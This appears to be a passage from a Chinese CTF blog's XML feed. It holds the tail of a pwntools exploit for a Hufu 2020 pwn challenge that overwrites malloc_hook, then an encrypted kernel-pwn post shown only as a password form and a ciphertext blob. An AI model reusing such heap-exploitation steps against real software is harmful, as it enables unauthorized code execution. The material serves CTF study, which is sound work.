class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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